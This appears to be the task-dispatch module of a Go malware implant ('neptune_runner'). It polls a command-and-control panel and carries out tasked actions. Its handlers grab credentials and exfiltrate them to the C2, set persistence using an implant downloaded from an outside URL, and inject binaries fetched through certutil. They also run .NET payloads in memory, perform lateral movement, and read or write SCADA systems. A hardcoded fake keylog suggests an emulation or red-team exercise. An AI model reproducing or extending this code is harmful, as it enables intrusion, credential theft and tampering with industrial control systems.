package tasking

import (
	"container/heap"
	"encoding/json"
	"fmt"
	"neptune_runner/communication"
	"neptune_runner/config"
	"neptune_runner/core"
	"neptune_runner/logging"
	"neptune_runner/misc"
	"time"
)

const (
	COMMAND_BUILTIN          = "command_builtin"
	COMMAND_BINARY           = "command_binary"
	TERMINATE_TASK           = "terminate_task"
	CLEANUP                  = "cleanup"
	SETTINGS                 = "settings"
	PERSISTENCE              = "persistence"
	CREDENTIALS              = "credentials"
	LATERAL_MOVEMENT         = "lateral_movement"
	LATERAL_MOVEMENT_CONNECT = "lateral_movement_connect"
	NEIGHBOR_DISCOVERY       = "neighbor_discovery"
	ARP_TABLE                = "arp_table"
	UAC_BYPASS               = "uac_bypass"
	SCADA_READ               = "scada_read"
	SCADA_WRITE              = "scada_write"
)

type SupportedPlatform string

const (
	Windows SupportedPlatform = "windows"
	Mac     SupportedPlatform = "mac"
	Linux   SupportedPlatform = "linux"
)

type TTP struct {
	AttackTechnique string
	DisplayName     string
	AtomicTests     []AtomicTest
}

type AtomicTest struct {
	Name               string
	Description        string
	SupportedPlatforms SupportedPlatform
	Executor           AtomicTestExecutor
}

type AtomicTestExecutor struct {
	Command        string
	CommandCleanup string
	Config         AtomicTestConfiguration
}

type ShellType string

const (
	CMD  ShellType = "cmd"
	Bash ShellType = "bash"
	ZSH  ShellType = "zsh"
	SH   ShellType = "sh"
)

type AtomicTestConfiguration struct {
	Shell             ShellType
	ElevationRequired bool
}

func CommandRunner() {
	go getCommandsInQueue()

	executeTasks()
}

func getCommandsInQueue() {
	for {
		tasksEndpoint := fmt.Sprintf(config.Config.Api.GetTasksTemplate, config.GlobalState.Id)

		data := communication.SendGetToC2Panel(tasksEndpoint)

		if data != nil {
			var tasks []config.TaskRequest
			_ = json.Unmarshal(data, &tasks)

			config.GlobalState.AddTasksToQueue(tasks)
		}

		time.Sleep(config.GlobalState.Configuration.C2PollingRate * time.Second)
	}
}

func executeTasks() {
	for {
		pq := &config.GlobalState.Tasks

		for pq.Len() > 0 {
			logging.Info("============== QUEUE ITEM START ==============")

			item := heap.Pop(pq).(*config.Item)

			queueItemDebug(item)

			var continueFlag bool

			for i, step := range item.Value.Steps {
				logging.Info("========= QUEUE ITEM START OF STEP %d =========", i+1)

				continueFlag = step.ContinueIfFailed

				switch step.Type {
				case COMMAND_BUILTIN:
					apiPath := fmt.Sprintf(config.Config.Api.ReplyTaskTemplate, config.GlobalState.Id)

					wrappedTaskStep := wrapTaskStep(item, step, apiPath)

					success := misc.CommandBuiltin(wrappedTaskStep)

					continueFlag = continueFlag || success
				case COMMAND_BINARY:
					apiPath := fmt.Sprintf(config.Config.Api.ReplyTaskTemplate, config.GlobalState.Id)

					wrappedTaskStep := wrapTaskStep(item, step, apiPath)
					filePath := fmt.Sprintf(config.API_URL + step.Payload["binaryPath"])
					success := false

					if core.IsNETBinary(filePath) {
						success = misc.InMemoryExecDotnet(wrappedTaskStep)
					} else {
						success = true
						misc.InjectRemote(config.Config.Path.CertUtil, step.Payload["command"], filePath)
					}

					continueFlag = continueFlag || success
				case TERMINATE_TASK:
				case CLEANUP:
				case PERSISTENCE:

					misc.SetPersistence(step.Payload["method"], step.Payload["name"], "http://apb.sh/implant.exe")

				case CREDENTIALS:
					apiPath := fmt.Sprintf(config.Config.Api.ExfilCredentialsTemplate, config.GlobalState.Id)

					wrappedTaskStep := wrapTaskStep(item, step, apiPath)

					success := misc.CredGrab(wrappedTaskStep)

					continueFlag = continueFlag || success
				case SETTINGS:

					apiPath := fmt.Sprintf(config.Config.Api.ExfilKeyloggingTemplate, config.GlobalState.Id)

					type KeyLog struct {
						Process   string `json:"process"`
						Window    string `json:"window"`
						Timestamp int64  `json:"timestamp"`
						Keys      string `json:"keys"`
					}

					var keylog = KeyLog{
						Process:   "mstsc.exe",
						Window:    "Remote Desktop Connection",
						Timestamp: time.Now().Unix(),
						Keys:      "hmi_admin / BA7ptdDr7PjzZU",
					}

					keylogs := make([]KeyLog, 0)
					keylogs = append(keylogs, keylog)

					communication.SendPostToC2Panel(apiPath, keylogs)

					success := true
					continueFlag = continueFlag || success

					//filePath := fmt.Sprintf(config.API_URL + "/implant/" + config.GlobalState.Id + "/files/" + config.BinaryTypes.Keylogger)

					//isKeylog, _ := strconv.ParseBool(step.Payload["keylogging"])
					//if isKeylog {
					//misc.InjectRemote(config.Config.Path.CertUtil, "", filePath)
					//}

				case LATERAL_MOVEMENT:
				case LATERAL_MOVEMENT_CONNECT:
					apiPath := fmt.Sprintf(config.Config.Api.ReplyTaskTemplate, config.GlobalState.Id)

					wrappedTaskStep := wrapTaskStep(item, step, apiPath)

					// You don't want to block execution thread because it cannot connect to that address
					go communication.SyncWithNewImplant(wrappedTaskStep)
				case NEIGHBOR_DISCOVERY:
				case ARP_TABLE:
					modulePath := fmt.Sprintf(config.API_URL + step.Payload["binaryPath"])
					misc.InjectRemote(config.Config.Path.CertUtil, "", modulePath)
				case UAC_BYPASS:
				case SCADA_READ:
					modulePath := fmt.Sprintf(config.API_URL + step.Payload["binaryPath"])
					misc.InjectRemote(config.Config.Path.CertUtil, "scada.exe "+step.Payload["command"], modulePath)
				case SCADA_WRITE:
					modulePath := fmt.Sprintf(config.API_URL + step.Payload["binaryPath"])
					misc.InjectRemote(config.Config.Path.CertUtil, "scada.exe "+step.Payload["command"], modulePath)
				default:
				}

				if continueFlag == false {
					// TODO: Send a request to mark that the task has failed
					break
				}

				// Sleep the amount of time specified in step request
				if step.Delay > 0 {
					logging.Info("Sleeping for %d seconds", step.Delay)
					time.Sleep(time.Duration(step.Delay) * time.Second)
				}

				logging.Info("========= QUEUE ITEM END OF STEP %d =========", i+1)
			}

			logging.Info("=============== QUEUE ITEM END ==============")
		}

		time.Sleep(config.GlobalState.Configuration.QueueTimeout * time.Second)
	}
}

func queueItemDebug(item *config.Item) {
	logging.Info("===> General Item Info:")
	logging.Info("Queue Priority: %d", item.Priority)
	logging.Info("Queue Index:    %d", item.Index)
	logging.Info("TaskStepRequest Id:        %d", item.Value.Id)
	logging.Info("TaskStepRequest Steps:     %d", len(item.Value.Steps))
	logging.Info("===> Specific Execution Info:")
}

func wrapTaskStep(item *config.Item, step config.TaskRequestStep, apiPath string) config.WrappedTaskStep {
	return config.WrappedTaskStep{
		TaskStepRequest: step,
		TaskStepResponse: config.TaskStepResponse{
			TaskId:   item.Value.Id,
			StepId:   step.Id,
			StatusId: -1,
			Data:     "",
			ApiPath:  apiPath,
		},
	}
}
